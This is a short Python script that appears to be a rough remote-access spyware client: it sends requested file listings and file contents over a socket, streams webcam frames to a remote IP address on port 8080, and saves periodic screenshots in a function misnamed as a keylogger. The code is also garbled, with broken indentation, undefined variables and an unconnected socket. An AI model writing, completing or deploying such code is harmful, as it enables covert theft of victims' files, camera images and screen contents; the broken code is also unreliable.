import pyautogui
import   socket,  os
import shutil       
import numpy,  cv2, time
port = 8080
#Control-C throws a keyboardinterrupt exception

def main():
	while True:
  		ip_address, port
		fileDirectory()
		webCam(ip_address)
		keLogger()

def fileDirectory():
	soc = socket.socket()
	userInput = soc.recv(5000)
	print("command received")
	userInput = userInput.decode()
        files = os.listdir(userInput)
        files = str(files)
        soc.send(files.encode())
	filePath.decode()
        file = open(filePath, "rb")
        data = file.read()
        soc.send(data)

def webCam(ip_address):
    try:
        cap = cv2.VideoCapture(1) #Capture from webcam       
        while True:
            ret, frame = cap.read() 
            _, imgencode = cv2.imencode(".jpg", frame) 
            data = numpy.array(imgencode) 
            stringData = data.tostring() 
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((ip_address, 8080))
            soc.sendall(stringData)
            soc.close()
    except:
        cap = cv2.VideoCapture(0) #Capture from webcam
        while True:
            ret, frame = cap.read() #get image from frame
            _, imgencode = cv2.imencode(".jpg", frame) #encode image into memory buffer
            data = numpy.array(imgencode) #create numpy array from image encoding
            stringData = data.tostring() #convert numpy array to string
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((ip_address, 8080))
            soc.sendall(stringData)
            soc.close()
def keLogger():
	x=1
	while True:
  	  	   img1 = pyautogui.screenshot()
   		   img1.save('screengrab'+str(x)+'.png')
    		    x+=1
   		    time.sleep(5)
    		   if time.sleep(5):
                      break